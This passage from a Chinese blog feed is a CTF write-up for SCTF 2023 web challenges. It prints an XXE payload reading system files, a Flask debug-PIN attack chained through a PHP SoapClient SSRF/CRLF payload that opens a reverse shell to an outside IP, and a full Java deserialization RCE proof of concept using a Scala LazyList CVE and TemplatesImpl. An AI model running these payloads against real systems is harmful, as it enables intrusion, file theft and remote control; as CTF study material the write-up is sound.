class="subst">$object</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://115.239.215.75:8081/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这个来上传抓包  然后添加PHPSESSID=xxx也行</strong>)</p><p>这里的考点主要是靠原生类   <a href="https://ke1nys.github.io/posts/28e06bac.html#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">ctfshow-愚人杯也考过这个考点</a></p><p>主要是有三个利用点 </p><ul><li>$object-&gt;sctf();</li><li>$object = new $type($properties[0], $properties[1]);</li><li>$object = file_get_contents(‘<a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a>‘ . $properties);</li></ul><p><strong>研究了一下，发现只有中间这个有用   并且类和参数都可控 </strong> <strong>用extract来控制</strong></p><p>(由于题目说的<code>/app/app.py</code>，那么我们就得去用原生类来读取这个文件)</p><p><code>$object = new $type($properties[0], $properties[1]);</code>   然后因为这里有两个参数   所以就得去找找既能读取文件，又是两个参数的原生类</p><p><img src="../images/image-20230621212254271.png" alt="image-20230621212254271"></p><p>刚好找到了这个类   可以使用xxe来读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$class</span> = <span class="string">&#x27;SimpleXMLElement&#x27;</span>;</span><br><span class="line"><span class="variable">$evilxml</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;properties&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$evilxml</span>, <span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;type&#x27;</span>=&gt;<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621222930826.png" alt="image-20230621222930826"></p><p>然后去读题目给的/app/app.py</p><p><img src="../images/image-20230621223042971.png" alt="image-20230621223042971"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开了debug只有两条路   <strong>热覆盖 和 算pin</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>这里注意一下   这里会调用<code>call</code>()方法  </p><p>覆盖暂时没找到原生类的call方法可以覆盖写文件的，而有个原生类的call是经常用：<code>SoapClient</code></p><p>可以用他的ssrf和crlf打组合拳，这样我们就可以把cookie塞</p><p><code>SoapClient</code>在ctfshow的web259有详细使用   <a href="https://ke1nys.github.io/posts/fd5983bb.html#web259">web259</a></p><p>接下来我们去看一下<code>console</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621233844882.png" alt="image-20230621233844882"></p><p>猜测是算pin</p><p>那么我们就可以用上面的<code>xxe</code>来读取算<code>pin</code>所需要的东西</p><p><img src="../images/image-20230621234154080.png" alt="image-20230621234154080"></p><p>所以这些得一个一个来获取</p><ul><li>machine_id  —&gt;  349b3354-f67f-4438-b395-4fbc01171fdd</li><li>uuidnode   ——&gt;   02:42:ac:13:00:02      (2485378023426)</li><li>moddir  <strong>flask库下app.py的绝对路径  但是这道题没给触发页面报错来获取信息  所以我们得使用别的原生类来模糊查找</strong></li></ul><p>(其实不用也行  可以猜一下  找到例题来看看他的<code>moddir</code>   然后修改一下python版本一下一下试就行了)</p><p><code>/usr/lib/python3.8/site-packages/flask/app.py</code>   这是moddir</p><p>有了这些东西之后  我们就可以直接算pin了</p><p>算出来的pin    <code>121-260-582</code></p><p>由于算pin来rce需要cookie的header   所以用常规的只会输出pin码   并不会输出cookie 所以得找一个脚本能两个同时生成的</p><p><img src="../images/image-20230622000408987.png" alt="image-20230622000408987"></p><p>然后去通过<code>soapclient</code>去访问debug界面，由于<code>debugmode</code>的rce需要携带cookie，因此只有<code>soapclient</code>可以做到   (<strong>其实就是ssrf加crlf</strong>)</p><p><strong>(简单点说就是伪造http头)</strong>     不明白的可以去看上面写的  <strong>web259的链接</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F101.42.39.110%2F3389%20%3C%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1687363437|11b8517fb9fb&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;wupco\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>),<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&quot;properties&quot;</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)),<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;SimpleXMLElement&quot;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">115.239</span><span class="number">.215</span><span class="number">.75</span>:<span class="number">8081</span></span><br><span class="line">Content-Length: <span class="number">922</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: null</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: PHPSESSID=1nys</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line">tyaoo</span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;data&quot;</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;properties&quot;</span>;s:<span class="number">643</span>:<span class="string">&quot;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A205%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2522os%2522%29.popen%28%2522bash%2520-c%2520%255C%2522bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F101.42.39.110%252F3389%2520%253C%25261%255C%2522%2522%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A92%3A%22wupco%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687363437%7C11b8517fb9fb%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;type&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;SimpleXMLElement&quot;</span>;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230622004425446.png" alt="image-20230622004425446"></p><p><strong>这吊题真难</strong></p><h2 id="hellojava"><a href="#hellojava" class="headerlink" title="hellojava"></a>hellojava</h2><p>题目就给了一个jar包   进行反编译查看</p><p><img src="../images/image-20230622195938811.png" alt="image-20230622195938811"></p><p><strong>这时jar包里的内容    还给了一个  <code>1.jar</code>   里面含有这个javassist  说明可以使用<code>templatesimpl</code></strong></p><p><img src="../images/image-20230622200111030.png" alt="image-20230622200111030"></p><p><strong>看了一下<code>pom.xml</code></strong></p><p>发现一共给了三种依赖</p><ul><li>scala    2.13.7</li><li>jackson</li><li>hessian     4.0.4</li></ul><p>一般来说就先对这个<code>pom.xml</code>的依赖进行分析  发现<code>scala</code>这个版本是存在漏洞的</p><p><img src="../images/image-20230622202022788.png" alt="image-20230622202022788"></p><p><img src="../images/image-20230622202525933.png" alt="image-20230622202525933"></p><p>找到了反序列化入口   那么关键点就是如何进入这个if判断了</p><p><img src="../images/image-20230622204854853.png" alt="image-20230622204854853"></p><p><img src="../images/image-20230622204904698.png" alt="image-20230622204904698"></p><p>这个东西要为true才行  但是如果简单的这样传值的话</p><p><code>&#123;&quot;IfInput&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code>  这样简单的传值的话是不行的</p><p><img src="../images/image-20230622205042591.png" alt="image-20230622205042591"></p><p>关键词搜索  <a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">Jackson注解的一个trick</a>   发现了这篇文章就是讲这个的</p><p><strong>使用空值就可以进行绕过了</strong></p><p><code>&#123;&quot;&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code></p><p>接下来就到如何进行反序列化利用了</p><p><img src="../images/image-20230622205655871.png" alt="image-20230622205655871"></p><p>结合这个<code>LazyList</code>东西和刚开始分析的<code>scala</code>漏洞的内容   可以猜测用这个反序列化来清空黑名单过滤</p><p><a href="https://github.com/yarocher/lazylist-cve-poc">https://github.com/yarocher/lazylist-cve-poc</a>   用这个代码  然后直接打就行了</p><p><code>mvn -q exec:java -Dexec.mainClass=&quot;poc.cve.lazylist.payload.Main&quot; -Dexec.args=&quot;./security/blacklist.txt false&quot;</code> 生成 Base64 payload</p><p><img src="../images/image-20230622213852125.png" alt="image-20230622213852125"></p><p>发包来打  将 <code>security/blacklist.txt</code> 清空</p><p>之后再使用 jackson 利用链，可以裸反序列化 RCE </p><p><img src="../images/image-20230622213955923.png" alt="image-20230622213955923"></p><p>最终<strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">11</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//serial(exp);</span></span><br><span class="line">        <span class="comment">//serialize(exp);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public static void doPOST(byte[] obj) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        HttpHeaders requestHeaders = new HttpHeaders();</span></span><br><span class="line"><span class="comment">//        requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);</span></span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://112.124.14.13:8080/bypassit&quot;);</span></span><br><span class="line"><span class="comment">//        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        RestTemplate restTemplate = new RestTemplate();</span></span><br><span class="line"><span class="comment">//        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(res.getBody());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(<strong>不知道为啥  这里我只能用这种形式的poc才能弹计算器    如果用<code>xx.class</code>这种形式的poc的话  是弹不出计算器的。。。。。。。</strong>)</p><p>这里注意的一点就是  新建项目的时候</p><p><img src="../images/image-20230624210123241.png" alt="image-20230624210123241"><em>**</em></p><p>得把<code>BaseJsonNode</code>里的这个东西给注释掉</p><p><strong>不然会报错</strong></p><p>这其实不是预期解  </p><p><img src="../images/image-20230624210304228.png" alt="image-20230624210304228"></p><p>预期解是打这个<code>hessian</code>这条链子</p><p><strong>官方wp是这样说的</strong></p><p><img src="../images/image-20230624210928869.png" alt="image-20230624210928869"></p><h2 id="an4er-monitor"><a href="#an4er-monitor" class="headerlink" title="an4er_monitor"></a>an4er_monitor</h2><p><strong>描述</strong></p><p><img src="../images/image-20230624212738790.png" alt="image-20230624212738790"></p><p>没环境   看官方wp有个思路就行了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezcheck1n&quot;&gt;&lt;a href=&quot;#ezcheck1n&quot; class=&quot;headerlink&quot; title=&quot;ezcheck1n&quot;&gt;&lt;/a&gt;&lt;strong&gt;ezcheck1n&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    
    <category term="sctf-web-2023" scheme="https://ke1nys.github.io/tags/sctf-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>java-shiro</title>
    <link href="https://ke1nys.github.io/posts/55797267.html"/>
    <id>https://ke1nys.github.io/posts/55797267.html</id>
    <published>2023-06-19T08:49:08.000Z</published>
    <updated>2023-06-21T08:41:22.399Z</updated>
    
